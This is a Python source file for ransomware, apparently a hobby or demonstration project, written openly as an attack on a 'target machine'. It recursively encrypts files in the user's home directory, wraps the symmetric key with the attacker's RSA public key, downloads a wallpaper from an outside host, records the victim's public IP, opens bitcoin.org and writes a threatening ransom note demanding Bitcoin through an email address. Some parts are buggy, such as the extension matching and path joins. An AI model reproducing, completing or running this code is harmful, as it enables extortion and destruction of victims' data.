# Imports
# import datetime  # To give time limit on ransom note
import os  # To get the system root to encrypt the whole system recursively
import ctypes
# import subprocess  # To create process for notepad and open ransom note
import threading  # Used at end to keep ransom note to pop-up and check desktop for decryption key
import time  # To set time.sleep interval for the ransom pop-up note & check desktop to decrypt system
import urllib.request  # Go to specific website to grab specific picture. Use w/ ctypes
import webbrowser  # To load users browsers and go to specific website
import requests  # Get IP address of target machine
#  import win32gui  # Used to get window text to see if ransom note is on top of all other windows
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from cryptography.fernet import Fernet  # Used to encrypt/decrypt files on target system


class Ransomware:
    # File extensions to seek out and Encrypt
    file_extensions = [
        '.txt',
        # We comment out .jpg so that we can see the ransomware only encrypts specific files we have chosen-
        # -and leaves other files un-encrypted etc.
        # '.jpg'

    ]

    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method
        self.key = None
        # Encrypt/Decryptor
        self.cryptor = None
        # RSA public key used for encrypting/decrypting fernet object eg. Symmetric key
        self.public_key = None

        """ Root directories to start Encryption/Decryption from
            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
            CAUTION: eg, use 'localRoot' and create some folder directories and files in them
        """
        # Use sysroot to create absolute path for files etc for encrypting whole system
        self.sysRoot = os.path.expanduser('~')
        # Use local root to test encryption software and for absolute path for files and encryption of Test system
        #  self.localRoot = r'C:\Users\wonky\PycharmProjects\Ransomware_Advanced\localRoot'

        # Get public IP of person, for more analysis etc. (Check if you have hit gov or military ip space LOL
        self.publicIP = requests.get('https://api.ipify.org').text

    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    def generate_key(self):
        # Generates a url safe (base64 encoded) key
        self.key = Fernet.generate_key()
        # Creates a fernet object with encrypt/decrypt methods
        self.cryptor = Fernet(self.key)

    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)

    # Encrypt [SYMMETRIC KEY] that was created on victims machine to Encrypt/Decrypt fiels with our -
    # -PUBLIC ASSYMETRIC RSA key that was created on OUR machine. We will later be able to DECRYPT the SYMMETRIC -
    # -key used for Encrypt/Decrypt of files on target machine with our PRIVATE KEY, then victim can decrypt files
    def encrypt_fernet_key(self, ):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            # Public RSA Key
            self.public_key = RSA.import_key(open('public.pem').read())
            # Public encryptor object
            public_encryptor = PKCS1_OAEP.new(self.public_key)
            # Encrypted fernet key
            encrypted_fernet_key = public_encryptor.encrypt(fernet_key)
            # Write encrypted fernet key to file
            f.write(encrypted_fernet_key)
        # Write encrypted fernet key to desktop as well so they can send this file to be unencrypted to get files back
        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:  # .localRoot / .sysRoot
            fa.write(encrypted_fernet_key)
        # Assign self.key to encrypted fernet key
        self.key = encrypted_fernet_key
        # Remove fernet cryptor object
        self.cryptor = None

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str: provide absolute file path
    # encrypted=False will ENcrypt if its equal to True it will DEcrypt
    def encrypt_and_decrypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            # Read data from file
            data = f.read()
            if not encrypted:
                # Print file contents - [debugging]
                print(data)
                # Encrypt data from file
                _data = self.cryptor.encrypt(data)
                # Log file encrypted and print encrypted contents - [debugging]
                print('> File encrypted')
                print(_data)
            else:
                # Decrypt data from file
                _data = self.cryptor.decrypt(data)
                # Log file decrypted and print decrypted contents - [debugging]
                print('> File decrypted')
                print(_data)
        with open(file_path, 'wb') as fp:
            # Write encrypted data to file using same filename to overwrite original file
            fp.write(_data)

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the SYMMETRIC KEY created on victim machine
    def encrypt_and_decrypt_system(self, encrypted=False):
        """ CAUTION: IF YOU CHANGE .localRoot BELOW TO .sysRoot YOU WILL ENCRYPT WHOLE COMPUTER -
         NOT JUST LOCAL ROOT"""
        system = os.walk(self.sysRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_extensions:
                    continue
                if not encrypted:
                    self.encrypt_and_decrypt_file(file_path)
                else:
                    self.encrypt_and_decrypt_file(file_path, encrypted=True)

    @staticmethod
    def what_is_bitcoin():
        url = 'https://bitcoin.org'
        # Opens browser to the https://bitcoin.org so they know what bitcoin is
        webbrowser.open(url)

    def change_desktop_background(self):
        imageUrl = 'https://cdn.wallpapersafari.com/34/56/IVOoGw.jpg'
        # Go to specific url and download image using absolute path
        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for functionality eg, changing desktop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def ransom_note(self):
        #  date = datetime.date.today().strftime('%d-%B-Y')
        with open('Ransom_Note.txt', 'w') as f:
            f.write(f'''
    The hard drive of your computer has been encrypted with a Military grade encryption algorithm:
    There is no way to restore your data without a special key.
    Only we can decrypt your files! 

    To purchase your key and restore your data, please follow these three easy steps:

    1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com

    2. You will receive your personal Bitcoin address for payment.
       Once payment has been completed you will send another email to GetYourFilesBack@protonmail.com stating "PAID"
       Then we will check if you have paid.

    3. You will receive a text file with your KEY that will unlock all your files.
       IMPORTANT: To decrypt your files, place text file on desktop and wait for it to decrypt your files

    WARNING WARNING WARNING:
    Do NOT attempt to decrypt your files with any software as it is obsolete and will not work, and may cost you more
    to unlock your files.
    Do NOT change file names, mess with the files, or run any decryption software, we will delete everything remotely.
    Do NOT send "PAID" without paying, price WILL increase for any disobedience
    Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay. WE WILL
''')

    # def show_ransom_note(self):
    #     # Open the ransom note
    #     ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
    #     count = 0  # debugging/Testing
    #     while True:
    #         time.sleep(0.1)
    #         top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    #         if top_window == 'RANSOM_NOTE - Notepad':
    #             print('Ransom note is the top window - do nothing')
    #             pass
    #         else:
    #             print('Ransom note is not the top window - kill/create process again')
    #             # Kill ransom note so we can open it again and make sure ransom note is in Foreground
    #             time.sleep(0.1)
    #             ransom.kill()
    #             # Open the ransom note
    #             time.sleep(0.1)
    #             ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
    #         # Sleep for 10 seconds
    #         time.sleep(10)
    #         count += 1
    #         if count == 5:
    #             break

    # Decrypts system when text file with un-encrypted key in it is placed on desktop of target machine
    def put_me_on_desktop(self):
        # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for -
        # - decrypting the files
        print('started')  # Debugging/testing
        while True:
            try:
                print('trying')  # Debugging/Testing
                # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the -
                # - unencrypted fernet key in this file and sends it in an email to vicitm. They then this it -
                # - on their desktop and it will be used to unencrypt the system. AT NO POINT DO THEY GET THE -
                # - PRIVATE ASYMMETRIC KEY
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.cryptor = Fernet(self.key)
                    # Decrypt system once the file is found and have cryptor with the correct key
                    self.encrypt_and_decrypt_system(encrypted=True)  # This line then decrypts all the files
                    print('Decrypted')  # Debugging/Testing
                    break
            except Exception as e:
                print(e)  # Debugging/Testing
                pass
            time.sleep(10)  # Debugging/Testing check for file on desktop every 10 seconds
            print('Checking for PUT_ME_ON_DESKTOP.txt')  # Debugging/Testing

    def main(self):
        # Testfile = enter(absolute path of the testing file
        # Below shows the METHODS in the order in which they go
        rw = Ransomware()
        rw.generate_key()
        rw.encrypt_and_decrypt_system()
        rw.write_key()
        rw.encrypt_fernet_key()
        rw.change_desktop_background()
        rw.what_is_bitcoin()
        # rw.show_ransom_note()

        # t1 = threading.Thread(target=rw.show_ransom_note)
        t2 = threading.Thread(target=rw.put_me_on_desktop)

        # t1.start()
        # print('> Ransomware: Attack completed on target machine and system is encrypted')
        # print('> Waiting for attacker to give target machine document that will decrypt machine')
        t2.start()
        print('> Ransomware: Target machine has been decrypted')
        print('> Ransomware: Completed')
